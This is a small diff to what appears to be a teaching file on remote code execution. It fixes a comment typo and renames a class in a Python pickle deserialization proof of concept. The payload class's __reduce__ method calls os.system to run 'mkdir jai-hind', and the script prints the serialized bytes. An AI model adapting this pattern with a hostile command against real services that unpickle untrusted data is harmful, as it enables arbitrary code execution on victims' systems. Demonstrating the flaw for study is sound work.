@@ -1,4 +1,4 @@
-                      #ai Hind..
+                      #Jai Hind..
 
 #hese codes are vulnerable to kinda RCE(Remote code execution).
 
@@ -97,12 +97,12 @@ if __name__ == '__main__':
 import pickle
 import os
 
-class MyEvilPickle(object):
+class cheatpickle(object):
 	def __reduce__(self):
 		return (os.system, ('mkdir jai-hind', ))
 
 
-pickle_data = pickle.dumps(MyEvilPickle())
+pickle_data = pickle.dumps(cheatpickle())
 print(pickle_data)
 
 
